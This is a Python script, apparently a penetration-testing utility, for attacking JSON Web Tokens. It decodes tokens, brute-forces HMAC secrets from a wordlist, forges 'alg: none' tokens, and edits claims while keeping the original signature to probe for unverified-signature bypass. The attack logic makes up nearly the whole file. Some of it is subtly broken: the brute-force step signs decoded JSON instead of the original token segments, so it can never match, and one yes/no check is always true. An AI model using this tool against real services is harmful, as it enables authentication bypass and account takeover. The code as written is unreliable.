import base64
import json
import hmac 
import hashlib
import sys
import argparse

def jwt_decode(token):
    try:
        token_parts = token.split(".")
        if len(token_parts) != 3:
            raise ValueError("Invalid JWT token format")

        decoded_header = base64.urlsafe_b64decode(token_parts[0] + "==").decode('utf-8')
        decoded_payload = base64.urlsafe_b64decode(token_parts[1] + "==").decode('utf-8')
        signature = token_parts[2]  # Signature is binary data, so no need to decode

        print("Decoded Header: ", decoded_header)
        print("Decoded Payload: ", decoded_payload)

        return decoded_header, decoded_payload, signature

    except UnicodeDecodeError as e:
        print(f"Error decoding JWT part: {e}")
        return None, None, None
    except Exception as e:
        print(f"Error: {e}")
        return None, None, None

def b64_encode(content):
    out=base64.urlsafe_b64encode(json.dumps(content).encode()).rstrip(b'=').decode('utf-8')
    return out

def jwt_secret_bruteforce(file_path, token):
    try:
        header_b64, payload_b64, signature_b64 = jwt_decode(token)
        if not all([header_b64, payload_b64, signature_b64]):
            print("Failed to decode JWT. Exiting.")
            return

        params = f'{header_b64}.{payload_b64}'

        with open(file_path, "r") as candidate_keys:
            for key in candidate_keys:
                key = key.strip()
                new_signature = hmac.new(key.encode(), params.encode(), hashlib.sha256).digest()
                new_signature_encoded = base64.urlsafe_b64encode(new_signature).rstrip(b'=').decode('utf-8')
                if new_signature_encoded == signature_b64:
                    print("Secret Found: ", key)
                    break
    except Exception as e:
        print(f"An error occurred: {e}")
        print("Please provide a valid secrets wordlist using the -f option.")

def alg_none(token):
    header, payload, signature = jwt_decode(token)

    if header and payload and signature:
        try:
            # Parse the header as JSON
            header_json = json.loads(header)

            # Change the 'alg' field to 'none'
            header_json['alg'] = 'none'

            # Re-encode the header to base64
            new_header_b64 = base64.urlsafe_b64encode(json.dumps(header_json).encode()).rstrip(b'=').decode('utf-8')

            # Create a new token with the modified header, the original payload, and no signature
            new_token = f'{new_header_b64}.{token.split(".")[1]}.'

            print("Modified JWT with 'none' alg: ", new_token)
            return new_token

        except json.JSONDecodeError as e:
            print(f"Error decoding JWT header as JSON: {e}")
            return None

def add_param(jwt_section, json_data):
    try:
        print(f"Current {jwt_section}: {json_data}")
        jwt_parameter = input(f"Enter the new parameter name to add in {jwt_section}: ")
        param_value = input(f"Enter the value for {jwt_parameter}: ")
        json_data[jwt_parameter] = param_value
        return json_data

    except Exception as e:
        print(f"Error adding parameter: {e}")
        return json_data

def edit_param(token):
    header, payload, signature = jwt_decode(token)
    if header and payload:
        try:
            header_json = json.loads(header)
            payload_json = json.loads(payload)
            while True:
                #print(header_json,"\n", payload_json)
                jwt_section=input("Section of token you want to edit (header/payload): ")
                
                #edit header parameter

                if jwt_section=="header":
                    print(header_json)
                    jwt_parameter=input("Select parameter you want to edit: ")
                    param_value=input("Enter the value: ")
                    header_json[jwt_parameter]=param_value
                    preview=f'{header_json} {payload_json}'
                    final_token=f'{b64_encode(header_json)}.{b64_encode(payload_json)}'
                    print(final_token)
                    
                    flag = input("Edit more? (yes/no) ").strip().lower()
                    if flag == "yes" or 'y':
                        pass
                    else: 
                        break
                    
                #edit payload parameter

                elif jwt_section=="payload":
                    print(payload_json)
                    jwt_parameter=input("Select parameter you want to edit: ")
                    param_value=input("Enter the value: ")
                    payload_json[jwt_parameter]=param_value
                    preview=f'{header_json} {payload_json}'
                    final_token=f'{b64_encode(header_json)}.{b64_encode(payload_json)}'
                    print(final_token)
                    
                    flag = input("Edit more? (yes/no) ").strip().lower()
                    if flag == "yes" or 'y':
                        pass
                    else: 
                        break

                else:
                    print("invalid input")
                break
                
        except json.JSONDecodeError as e:
            print(f"Error decoding JWT header as JSON: {e}")
            return None
        
        return final_token, signature 
    
def unverified_sign(token):
    new_token, signature=edit_param(token)
    final_token=f'{new_token}.{signature}'
    print(final_token)
   
    


def main():

    parser = argparse.ArgumentParser(description="JWT secret brute-forcing tool.")
    
    parser.add_argument("-f", "--file", type=str, required=False, help="Path to the wordlist.")
    parser.add_argument("-t", "--token", type=str, required=True, help="JSON Web Token (JWT) to brute-force.")
    parser.add_argument("-d","--decode", action="store_true", help="Decode JWT.")
    parser.add_argument("-bf","--bruteforce", action="store_true", help="BruteForce JWT Secret.")
    parser.add_argument("-n","--none", action="store_true", help="None alg scan.")
    parser.add_argument("-e", "--edit", action="store_true", help="Edit paraemter values.")
    parser.add_argument("-us", "--unverified", action="store_true", help="Generate token with alterred values with same sigature to test unverified signature bypass")

    args = parser.parse_args()
    file_path = args.file
    token = args.token

    if args.decode:
        jwt_decode(token)
    elif args.bruteforce:
        jwt_secret_bruteforce(file_path, token)
    elif args.none:
        alg_none(token)
    elif args.edit:
        edit_param(token)
    elif args.unverified:
        unverified_sign(token)

    return file_path, token

if __name__ == "__main__":
    file_path, token = main()
    print(f"Wordlist File Path: {file_path}")
    print(f"JWT Token: {token}")
